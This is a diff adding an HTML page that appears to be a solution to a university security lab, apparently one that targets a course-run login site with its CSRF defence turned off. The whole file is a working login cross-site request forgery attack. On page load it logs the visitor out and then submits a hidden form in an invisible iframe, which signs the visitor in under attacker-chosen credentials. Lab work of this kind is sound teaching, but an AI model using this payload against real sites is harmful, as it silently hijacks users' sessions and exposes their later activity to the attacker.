@@ -1,0 +1,24 @@
+<html>
+
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+
+
+
+<body>
+	<iframe name='my_frame' style='position: absolute; width: 0; height: 0; border:0'></iframe>
+	<form method='POST' action='https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4' id='my_id' target='my_frame'>
+		<input id='username' type='hidden' name='username' value='attacker'>
+		<input id='userpass' type='hidden' name='password' value='l33th4x'>
+	</form>
+</body>
+
+
+
+<script>
+	$.post('https://project2.ecen4133.org/logout');
+	document.getElementById("my_id").submit();
+</script>
+
+</html>
